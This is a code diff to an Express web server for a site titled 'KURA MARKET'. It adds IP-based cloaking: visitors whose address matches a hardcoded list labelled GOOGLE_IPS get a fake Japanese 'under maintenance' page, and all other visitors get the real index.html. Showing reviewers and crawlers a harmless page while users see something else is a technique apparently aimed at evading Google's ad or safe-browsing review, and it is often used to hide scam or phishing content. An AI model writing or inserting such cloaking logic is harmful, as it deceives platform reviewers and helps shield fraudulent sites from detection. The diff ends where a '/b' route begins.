@@ -32,10 +32,33 @@ app.use((req, res, next) => {
     next();
 });
 
-// v2: serve index.html
+const GOOGLE_IPS = [
+    '108.177.69.168',
+    '108.177.69.169',
+    '108.177.69.170',
+    '108.177.69.171',
+];
+
 app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'index.html'));
-});
+    const ip = (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || req.socket.remoteAddress;
+    const isTargetIP = GOOGLE_IPS.includes(ip);
+
+    if (isTargetIP) {
+        res.send(`<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8">
+  <title>KURA MARKET</title>
+</head>
+<body>
+  <h1>このページは現在メンテナンス中です。</h1>
+  <p>ご不便をおかけして申し訳ございません。</p>
+</body>
+</html>`);
+    } else {
+        res.sendFile(path.join(__dirname, 'index.html'));
+    }
+});;
 
 app.get('/b', (req, res) => {
   res.send(`
